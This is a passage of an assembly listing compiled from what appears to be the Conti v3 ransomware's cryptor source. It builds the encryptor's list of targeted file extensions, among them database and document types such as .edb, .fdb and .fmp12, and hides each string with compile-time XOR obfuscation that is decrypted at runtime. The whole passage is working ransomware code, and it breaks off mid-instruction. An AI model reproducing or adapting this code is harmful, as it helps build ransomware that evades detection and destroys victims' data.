; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0108b	c6 85 40 01 00
	00 00		 mov	 BYTE PTR $T44[rbp-256], 0
  01092	c6 85 41 01 00
	00 3d		 mov	 BYTE PTR $T44[rbp-255], 61 ; 0000003dH
  01099	c6 85 42 01 00
	00 78		 mov	 BYTE PTR $T44[rbp-254], 120 ; 00000078H
  010a0	c6 85 43 01 00
	00 3a		 mov	 BYTE PTR $T44[rbp-253], 58 ; 0000003aH
  010a7	c6 85 44 01 00
	00 78		 mov	 BYTE PTR $T44[rbp-252], 120 ; 00000078H
  010ae	c6 85 45 01 00
	00 16		 mov	 BYTE PTR $T44[rbp-251], 22
  010b5	c6 85 46 01 00
	00 78		 mov	 BYTE PTR $T44[rbp-250], 120 ; 00000078H
  010bc	c6 85 47 01 00
	00 4e		 mov	 BYTE PTR $T44[rbp-249], 78 ; 0000004eH
  010c3	c6 85 48 01 00
	00 78		 mov	 BYTE PTR $T44[rbp-248], 120 ; 00000078H
  010ca	c6 85 49 01 00
	00 78		 mov	 BYTE PTR $T44[rbp-247], 120 ; 00000078H
  010d1	c6 85 4a 01 00
	00 78		 mov	 BYTE PTR $T44[rbp-246], 120 ; 00000078H
  010d8	0f b6 85 41 01
	00 00		 movzx	 eax, BYTE PTR $T44[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 337  : 		OBFW(L".dqy"),

  010df	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$06$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<7,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  010e4	48 89 85 88 0b
	00 00		 mov	 QWORD PTR Extensions$[rbp+88], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  010eb	c6 85 50 01 00
	00 00		 mov	 BYTE PTR $T45[rbp-256], 0
  010f2	c6 85 51 01 00
	00 4a		 mov	 BYTE PTR $T45[rbp-255], 74 ; 0000004aH

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  010f9	c6 85 52 01 00
	00 2d		 mov	 BYTE PTR $T45[rbp-254], 45 ; 0000002dH
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 338  : 		OBFW(L".dsk"),

  01100	48 8d 8d 50 01
	00 00		 lea	 rcx, QWORD PTR $T45[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  01107	c6 85 53 01 00
	00 61		 mov	 BYTE PTR $T45[rbp-253], 97 ; 00000061H
  0110e	c6 85 54 01 00
	00 2d		 mov	 BYTE PTR $T45[rbp-252], 45 ; 0000002dH
  01115	c6 85 55 01 00
	00 36		 mov	 BYTE PTR $T45[rbp-251], 54 ; 00000036H
  0111c	c6 85 56 01 00
	00 2d		 mov	 BYTE PTR $T45[rbp-250], 45 ; 0000002dH
  01123	c6 85 57 01 00
	00 3c		 mov	 BYTE PTR $T45[rbp-249], 60 ; 0000003cH
  0112a	c6 85 58 01 00
	00 2d		 mov	 BYTE PTR $T45[rbp-248], 45 ; 0000002dH
  01131	c6 85 59 01 00
	00 2d		 mov	 BYTE PTR $T45[rbp-247], 45 ; 0000002dH
  01138	c6 85 5a 01 00
	00 2d		 mov	 BYTE PTR $T45[rbp-246], 45 ; 0000002dH
  0113f	0f b6 85 51 01
	00 00		 movzx	 eax, BYTE PTR $T45[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 338  : 		OBFW(L".dsk"),

  01146	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BP@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<31,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  0114b	48 89 85 90 0b
	00 00		 mov	 QWORD PTR Extensions$[rbp+96], rax

; 339  : 		OBFW(L".dsn"),

  01152	48 8d 8d 60 01
	00 00		 lea	 rcx, QWORD PTR $T46[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  01159	c6 85 60 01 00
	00 00		 mov	 BYTE PTR $T46[rbp-256], 0
  01160	c6 85 61 01 00
	00 3d		 mov	 BYTE PTR $T46[rbp-255], 61 ; 0000003dH
  01167	c6 85 62 01 00
	00 7c		 mov	 BYTE PTR $T46[rbp-254], 124 ; 0000007cH
  0116e	c6 85 63 01 00
	00 67		 mov	 BYTE PTR $T46[rbp-253], 103 ; 00000067H
  01175	c6 85 64 01 00
	00 7c		 mov	 BYTE PTR $T46[rbp-252], 124 ; 0000007cH
  0117c	c6 85 65 01 00
	00 1e		 mov	 BYTE PTR $T46[rbp-251], 30
  01183	c6 85 66 01 00
	00 7c		 mov	 BYTE PTR $T46[rbp-250], 124 ; 0000007cH
  0118a	c6 85 67 01 00
	00 0c		 mov	 BYTE PTR $T46[rbp-249], 12
  01191	c6 85 68 01 00
	00 7c		 mov	 BYTE PTR $T46[rbp-248], 124 ; 0000007cH
  01198	c6 85 69 01 00
	00 7c		 mov	 BYTE PTR $T46[rbp-247], 124 ; 0000007cH
  0119f	c6 85 6a 01 00
	00 7c		 mov	 BYTE PTR $T46[rbp-246], 124 ; 0000007cH
  011a6	0f b6 85 61 01
	00 00		 movzx	 eax, BYTE PTR $T46[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 339  : 		OBFW(L".dsn"),

  011ad	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BN@$0HM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<29,124,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  011b2	48 89 85 98 0b
	00 00		 mov	 QWORD PTR Extensions$[rbp+104], rax

; 340  : 		OBFW(L".dtsx"),

  011b9	48 8d 8d c0 07
	00 00		 lea	 rcx, QWORD PTR $T47[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  011c0	c6 85 c0 07 00
	00 00		 mov	 BYTE PTR $T47[rbp-256], 0
  011c7	c6 85 c1 07 00
	00 29		 mov	 BYTE PTR $T47[rbp-255], 41 ; 00000029H
  011ce	c6 85 c2 07 00
	00 15		 mov	 BYTE PTR $T47[rbp-254], 21
  011d5	c6 85 c3 07 00
	00 46		 mov	 BYTE PTR $T47[rbp-253], 70 ; 00000046H
  011dc	c6 85 c4 07 00
	00 15		 mov	 BYTE PTR $T47[rbp-252], 21
  011e3	c6 85 c5 07 00
	00 58		 mov	 BYTE PTR $T47[rbp-251], 88 ; 00000058H
  011ea	c6 85 c6 07 00
	00 15		 mov	 BYTE PTR $T47[rbp-250], 21
  011f1	c6 85 c7 07 00
	00 47		 mov	 BYTE PTR $T47[rbp-249], 71 ; 00000047H
  011f8	c6 85 c8 07 00
	00 15		 mov	 BYTE PTR $T47[rbp-248], 21
  011ff	c6 85 c9 07 00
	00 1d		 mov	 BYTE PTR $T47[rbp-247], 29
  01206	c6 85 ca 07 00
	00 15		 mov	 BYTE PTR $T47[rbp-246], 21
  0120d	c6 85 cb 07 00
	00 15		 mov	 BYTE PTR $T47[rbp-245], 21
  01214	c6 85 cc 07 00
	00 15		 mov	 BYTE PTR $T47[rbp-244], 21
  0121b	0f b6 85 c1 07
	00 00		 movzx	 eax, BYTE PTR $T47[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 340  : 		OBFW(L".dtsx"),

  01222	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BB@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ; MetaBuffer<17,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
  01227	48 89 85 a0 0b
	00 00		 mov	 QWORD PTR Extensions$[rbp+112], rax

; 341  : 		OBFW(L".dxl"),

  0122e	48 8d 8d 70 01
	00 00		 lea	 rcx, QWORD PTR $T48[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  01235	c6 85 70 01 00
	00 00		 mov	 BYTE PTR $T48[rbp-256], 0
  0123c	c6 85 71 01 00
	00 68		 mov	 BYTE PTR $T48[rbp-255], 104 ; 00000068H
  01243	c6 85 72 01 00
	00 1e		 mov	 BYTE PTR $T48[rbp-254], 30
  0124a	c6 85 73 01 00
	00 61		 mov	 BYTE PTR $T48[rbp-253], 97 ; 00000061H
  01251	c6 85 74 01 00
	00 1e		 mov	 BYTE PTR $T48[rbp-252], 30
  01258	c6 85 75 01 00
	00 55		 mov	 BYTE PTR $T48[rbp-251], 85 ; 00000055H
  0125f	c6 85 76 01 00
	00 1e		 mov	 BYTE PTR $T48[rbp-250], 30
  01266	c6 85 77 01 00
	00 10		 mov	 BYTE PTR $T48[rbp-249], 16
  0126d	c6 85 78 01 00
	00 1e		 mov	 BYTE PTR $T48[rbp-248], 30
  01274	c6 85 79 01 00
	00 1e		 mov	 BYTE PTR $T48[rbp-247], 30
  0127b	c6 85 7a 01 00
	00 1e		 mov	 BYTE PTR $T48[rbp-246], 30
  01282	0f b6 85 71 01
	00 00		 movzx	 eax, BYTE PTR $T48[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 341  : 		OBFW(L".dxl"),

  01289	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GF@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<101,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  0128e	48 89 85 a8 0b
	00 00		 mov	 QWORD PTR Extensions$[rbp+120], rax

; 342  : 		OBFW(L".eco"),

  01295	48 8d 8d 80 01
	00 00		 lea	 rcx, QWORD PTR $T49[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0129c	c6 85 80 01 00
	00 00		 mov	 BYTE PTR $T49[rbp-256], 0
  012a3	c6 85 81 01 00
	00 30		 mov	 BYTE PTR $T49[rbp-255], 48 ; 00000030H
  012aa	c6 85 82 01 00
	00 43		 mov	 BYTE PTR $T49[rbp-254], 67 ; 00000043H
  012b1	c6 85 83 01 00
	00 11		 mov	 BYTE PTR $T49[rbp-253], 17
  012b8	c6 85 84 01 00
	00 43		 mov	 BYTE PTR $T49[rbp-252], 67 ; 00000043H
  012bf	c6 85 85 01 00
	00 3e		 mov	 BYTE PTR $T49[rbp-251], 62 ; 0000003eH
  012c6	c6 85 86 01 00
	00 43		 mov	 BYTE PTR $T49[rbp-250], 67 ; 00000043H
  012cd	c6 85 87 01 00
	00 2e		 mov	 BYTE PTR $T49[rbp-249], 46 ; 0000002eH
  012d4	c6 85 88 01 00
	00 43		 mov	 BYTE PTR $T49[rbp-248], 67 ; 00000043H
  012db	c6 85 89 01 00
	00 43		 mov	 BYTE PTR $T49[rbp-247], 67 ; 00000043H
  012e2	c6 85 8a 01 00
	00 43		 mov	 BYTE PTR $T49[rbp-246], 67 ; 00000043H
  012e9	0f b6 85 81 01
	00 00		 movzx	 eax, BYTE PTR $T49[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 342  : 		OBFW(L".eco"),

  012f0	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0CJ@$0ED@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<41,67,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  012f5	48 89 85 b0 0b
	00 00		 mov	 QWORD PTR Extensions$[rbp+128], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  012fc	c6 85 90 01 00
	00 00		 mov	 BYTE PTR $T50[rbp-256], 0
  01303	c6 85 91 01 00
	00 7e		 mov	 BYTE PTR $T50[rbp-255], 126 ; 0000007eH
  0130a	c6 85 92 01 00
	00 30		 mov	 BYTE PTR $T50[rbp-254], 48 ; 00000030H
  01311	c6 85 93 01 00
	00 1a		 mov	 BYTE PTR $T50[rbp-253], 26
  01318	c6 85 94 01 00
	00 30		 mov	 BYTE PTR $T50[rbp-252], 48 ; 00000030H
  0131f	c6 85 95 01 00
	00 7a		 mov	 BYTE PTR $T50[rbp-251], 122 ; 0000007aH

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  01326	c6 85 96 01 00
	00 30		 mov	 BYTE PTR $T50[rbp-250], 48 ; 00000030H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 343  : 		OBFW(L".ecx"),

  0132d	48 8d 8d 90 01
	00 00		 lea	 rcx, QWORD PTR $T50[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  01334	c6 85 97 01 00
	00 03		 mov	 BYTE PTR $T50[rbp-249], 3
  0133b	c6 85 98 01 00
	00 30		 mov	 BYTE PTR $T50[rbp-248], 48 ; 00000030H
  01342	c6 85 99 01 00
	00 30		 mov	 BYTE PTR $T50[rbp-247], 48 ; 00000030H
  01349	c6 85 9a 01 00
	00 30		 mov	 BYTE PTR $T50[rbp-246], 48 ; 00000030H
  01350	0f b6 85 91 01
	00 00		 movzx	 eax, BYTE PTR $T50[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 343  : 		OBFW(L".ecx"),

  01357	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0EP@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<79,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  0135c	48 89 85 b8 0b
	00 00		 mov	 QWORD PTR Extensions$[rbp+136], rax

; 344  : 		OBFW(L".edb"),

  01363	48 8d 8d a0 01
	00 00		 lea	 rcx, QWORD PTR $T51[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0136a	c6 85 a0 01 00
	00 00		 mov	 BYTE PTR $T51[rbp-256], 0
  01371	c6 85 a1 01 00
	00 4c		 mov	 BYTE PTR $T51[rbp-255], 76 ; 0000004cH
  01378	c6 85 a2 01 00
	00 0f		 mov	 BYTE PTR $T51[rbp-254], 15
  0137f	c6 85 a3 01 00
	00 66		 mov	 BYTE PTR $T51[rbp-253], 102 ; 00000066H
  01386	c6 85 a4 01 00
	00 0f		 mov	 BYTE PTR $T51[rbp-252], 15
  0138d	c6 85 a5 01 00
	00 78		 mov	 BYTE PTR $T51[rbp-251], 120 ; 00000078H
  01394	c6 85 a6 01 00
	00 0f		 mov	 BYTE PTR $T51[rbp-250], 15
  0139b	c6 85 a7 01 00
	00 1d		 mov	 BYTE PTR $T51[rbp-249], 29
  013a2	c6 85 a8 01 00
	00 0f		 mov	 BYTE PTR $T51[rbp-248], 15
  013a9	c6 85 a9 01 00
	00 0f		 mov	 BYTE PTR $T51[rbp-247], 15
  013b0	c6 85 aa 01 00
	00 0f		 mov	 BYTE PTR $T51[rbp-246], 15
  013b7	0f b6 85 a1 01
	00 00		 movzx	 eax, BYTE PTR $T51[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 344  : 		OBFW(L".edb"),

  013be	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GN@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<109,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  013c3	48 89 85 c0 0b
	00 00		 mov	 QWORD PTR Extensions$[rbp+144], rax

; 345  : 		OBFW(L".epim"),

  013ca	48 8d 8d d0 07
	00 00		 lea	 rcx, QWORD PTR $T52[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  013d1	c6 85 d0 07 00
	00 00		 mov	 BYTE PTR $T52[rbp-256], 0
  013d8	c6 85 d1 07 00
	00 6a		 mov	 BYTE PTR $T52[rbp-255], 106 ; 0000006aH
  013df	c6 85 d2 07 00
	00 0a		 mov	 BYTE PTR $T52[rbp-254], 10
  013e6	c6 85 d3 07 00
	00 16		 mov	 BYTE PTR $T52[rbp-253], 22
  013ed	c6 85 d4 07 00
	00 0a		 mov	 BYTE PTR $T52[rbp-252], 10
  013f4	c6 85 d5 07 00
	00 38		 mov	 BYTE PTR $T52[rbp-251], 56 ; 00000038H
  013fb	c6 85 d6 07 00
	00 0a		 mov	 BYTE PTR $T52[rbp-250], 10
  01402	c6 85 d7 07 00
	00 45		 mov	 BYTE PTR $T52[rbp-249], 69 ; 00000045H
  01409	c6 85 d8 07 00
	00 0a		 mov	 BYTE PTR $T52[rbp-248], 10
  01410	c6 85 d9 07 00
	00 74		 mov	 BYTE PTR $T52[rbp-247], 116 ; 00000074H
  01417	c6 85 da 07 00
	00 0a		 mov	 BYTE PTR $T52[rbp-246], 10
  0141e	c6 85 db 07 00
	00 0a		 mov	 BYTE PTR $T52[rbp-245], 10
  01425	c6 85 dc 07 00
	00 0a		 mov	 BYTE PTR $T52[rbp-244], 10
  0142c	0f b6 85 d1 07
	00 00		 movzx	 eax, BYTE PTR $T52[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 345  : 		OBFW(L".epim"),

  01433	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GL@$09U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ; MetaBuffer<107,10,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
  01438	48 89 85 c8 0b
	00 00		 mov	 QWORD PTR Extensions$[rbp+152], rax

; 346  : 		OBFW(L".exb"),

  0143f	48 8d 8d b0 01
	00 00		 lea	 rcx, QWORD PTR $T53[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  01446	c6 85 b0 01 00
	00 00		 mov	 BYTE PTR $T53[rbp-256], 0
  0144d	c6 85 b1 01 00
	00 5c		 mov	 BYTE PTR $T53[rbp-255], 92 ; 0000005cH
  01454	c6 85 b2 01 00
	00 4b		 mov	 BYTE PTR $T53[rbp-254], 75 ; 0000004bH
  0145b	c6 85 b3 01 00
	00 5d		 mov	 BYTE PTR $T53[rbp-253], 93 ; 0000005dH
  01462	c6 85 b4 01 00
	00 4b		 mov	 BYTE PTR $T53[rbp-252], 75 ; 0000004bH
  01469	c6 85 b5 01 00
	00 1f		 mov	 BYTE PTR $T53[rbp-251], 31
  01470	c6 85 b6 01 00
	00 4b		 mov	 BYTE PTR $T53[rbp-250], 75 ; 0000004bH
  01477	c6 85 b7 01 00
	00 38		 mov	 BYTE PTR $T53[rbp-249], 56 ; 00000038H
  0147e	c6 85 b8 01 00
	00 4b		 mov	 BYTE PTR $T53[rbp-248], 75 ; 0000004bH
  01485	c6 85 b9 01 00
	00 4b		 mov	 BYTE PTR $T53[rbp-247], 75 ; 0000004bH
  0148c	c6 85 ba 01 00
	00 4b		 mov	 BYTE PTR $T53[rbp-246], 75 ; 0000004bH
  01493	0f b6 85 b1 01
	00 00		 movzx	 eax, BYTE PTR $T53[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 346  : 		OBFW(L".exb"),

  0149a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GB@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<97,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  0149f	48 89 85 d0 0b
	00 00		 mov	 QWORD PTR Extensions$[rbp+160], rax

; 347  : 		OBFW(L".fcd"),

  014a6	48 8d 8d c0 01
	00 00		 lea	 rcx, QWORD PTR $T54[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  014ad	c6 85 c0 01 00
	00 00		 mov	 BYTE PTR $T54[rbp-256], 0
  014b4	c6 85 c1 01 00
	00 49		 mov	 BYTE PTR $T54[rbp-255], 73 ; 00000049H
  014bb	c6 85 c2 01 00
	00 00		 mov	 BYTE PTR $T54[rbp-254], 0
  014c2	c6 85 c3 01 00
	00 44		 mov	 BYTE PTR $T54[rbp-253], 68 ; 00000044H
  014c9	c6 85 c4 01 00
	00 00		 mov	 BYTE PTR $T54[rbp-252], 0
  014d0	c6 85 c5 01 00
	00 42		 mov	 BYTE PTR $T54[rbp-251], 66 ; 00000042H
  014d7	c6 85 c6 01 00
	00 00		 mov	 BYTE PTR $T54[rbp-250], 0
  014de	c6 85 c7 01 00
	00 6d		 mov	 BYTE PTR $T54[rbp-249], 109 ; 0000006dH
  014e5	c6 85 c8 01 00
	00 00		 mov	 BYTE PTR $T54[rbp-248], 0
  014ec	c6 85 c9 01 00
	00 00		 mov	 BYTE PTR $T54[rbp-247], 0
  014f3	c6 85 ca 01 00
	00 00		 mov	 BYTE PTR $T54[rbp-246], 0
  014fa	0f b6 85 c1 01
	00 00		 movzx	 eax, BYTE PTR $T54[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 347  : 		OBFW(L".fcd"),

  01501	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0CL@$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<43,0,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  01506	48 89 85 d8 0b
	00 00		 mov	 QWORD PTR Extensions$[rbp+168], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0150d	c6 85 d0 01 00
	00 00		 mov	 BYTE PTR $T55[rbp-256], 0
  01514	c6 85 d1 01 00
	00 2c		 mov	 BYTE PTR $T55[rbp-255], 44 ; 0000002cH
  0151b	c6 85 d2 01 00
	00 4f		 mov	 BYTE PTR $T55[rbp-254], 79 ; 0000004fH
  01522	c6 85 d3 01 00
	00 1d		 mov	 BYTE PTR $T55[rbp-253], 29
  01529	c6 85 d4 01 00
	00 4f		 mov	 BYTE PTR $T55[rbp-252], 79 ; 0000004fH
  01530	c6 85 d5 01 00
	00 19		 mov	 BYTE PTR $T55[rbp-251], 25
  01537	c6 85 d6 01 00
	00 4f		 mov	 BYTE PTR $T55[rbp-250], 79 ; 0000004fH
  0153e	c6 85 d7 01 00
	00 15		 mov	 BYTE PTR $T55[rbp-249], 21
  01545	c6 85 d8 01 00
	00 4f		 mov	 BYTE PTR $T55[rbp-248], 79 ; 0000004fH
  0154c	c6 85 d9 01 00
	00 4f		 mov	 BYTE PTR $T55[rbp-247], 79 ; 0000004fH

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  01553	c6 85 da 01 00
	00 4f		 mov	 BYTE PTR $T55[rbp-246], 79 ; 0000004fH
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 348  : 		OBFW(L".fdb"),

  0155a	48 8d 8d d0 01
	00 00		 lea	 rcx, QWORD PTR $T55[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  01561	0f b6 85 d1 01
	00 00		 movzx	 eax, BYTE PTR $T55[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 348  : 		OBFW(L".fdb"),

  01568	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$01$0EP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<2,79,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  0156d	48 89 85 e0 0b
	00 00		 mov	 QWORD PTR Extensions$[rbp+176], rax

; 349  : 		OBFW(L".fic"),

  01574	48 8d 8d e0 01
	00 00		 lea	 rcx, QWORD PTR $T56[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0157b	c6 85 e0 01 00
	00 00		 mov	 BYTE PTR $T56[rbp-256], 0
  01582	c6 85 e1 01 00
	00 27		 mov	 BYTE PTR $T56[rbp-255], 39 ; 00000027H
  01589	c6 85 e2 01 00
	00 66		 mov	 BYTE PTR $T56[rbp-254], 102 ; 00000066H
  01590	c6 85 e3 01 00
	00 0c		 mov	 BYTE PTR $T56[rbp-253], 12
  01597	c6 85 e4 01 00
	00 66		 mov	 BYTE PTR $T56[rbp-252], 102 ; 00000066H
  0159e	c6 85 e5 01 00
	00 63		 mov	 BYTE PTR $T56[rbp-251], 99 ; 00000063H
  015a5	c6 85 e6 01 00
	00 66		 mov	 BYTE PTR $T56[rbp-250], 102 ; 00000066H
  015ac	c6 85 e7 01 00
	00 34		 mov	 BYTE PTR $T56[rbp-249], 52 ; 00000034H
  015b3	c6 85 e8 01 00
	00 66		 mov	 BYTE PTR $T56[rbp-248], 102 ; 00000066H
  015ba	c6 85 e9 01 00
	00 66		 mov	 BYTE PTR $T56[rbp-247], 102 ; 00000066H
  015c1	c6 85 ea 01 00
	00 66		 mov	 BYTE PTR $T56[rbp-246], 102 ; 00000066H
  015c8	0f b6 85 e1 01
	00 00		 movzx	 eax, BYTE PTR $T56[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 349  : 		OBFW(L".fic"),

  015cf	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BN@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<29,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  015d4	48 89 85 e8 0b
	00 00		 mov	 QWORD PTR Extensions$[rbp+184], rax

; 350  : 		OBFW(L".fmp"),

  015db	48 8d 8d f0 01
	00 00		 lea	 rcx, QWORD PTR $T57[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  015e2	c6 85 f0 01 00
	00 00		 mov	 BYTE PTR $T57[rbp-256], 0
  015e9	c6 85 f1 01 00
	00 1f		 mov	 BYTE PTR $T57[rbp-255], 31
  015f0	c6 85 f2 01 00
	00 6f		 mov	 BYTE PTR $T57[rbp-254], 111 ; 0000006fH
  015f7	c6 85 f3 01 00
	00 21		 mov	 BYTE PTR $T57[rbp-253], 33 ; 00000021H
  015fe	c6 85 f4 01 00
	00 6f		 mov	 BYTE PTR $T57[rbp-252], 111 ; 0000006fH
  01605	c6 85 f5 01 00
	00 41		 mov	 BYTE PTR $T57[rbp-251], 65 ; 00000041H
  0160c	c6 85 f6 01 00
	00 6f		 mov	 BYTE PTR $T57[rbp-250], 111 ; 0000006fH
  01613	c6 85 f7 01 00
	00 73		 mov	 BYTE PTR $T57[rbp-249], 115 ; 00000073H
  0161a	c6 85 f8 01 00
	00 6f		 mov	 BYTE PTR $T57[rbp-248], 111 ; 0000006fH
  01621	c6 85 f9 01 00
	00 6f		 mov	 BYTE PTR $T57[rbp-247], 111 ; 0000006fH
  01628	c6 85 fa 01 00
	00 6f		 mov	 BYTE PTR $T57[rbp-246], 111 ; 0000006fH
  0162f	0f b6 85 f1 01
	00 00		 movzx	 eax, BYTE PTR $T57[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 350  : 		OBFW(L".fmp"),

  01636	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0DL@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<59,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  0163b	48 89 85 f0 0b
	00 00		 mov	 QWORD PTR Extensions$[rbp+192], rax

; 351  : 		OBFW(L".fmp12"),

  01642	48 8d 8d c0 08
	00 00		 lea	 rcx, QWORD PTR $T58[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  01649	c6 85 c0 08 00
	00 00		 mov	 BYTE PTR $T58[rbp-256], 0
  01650	c6 85 c1 08 00
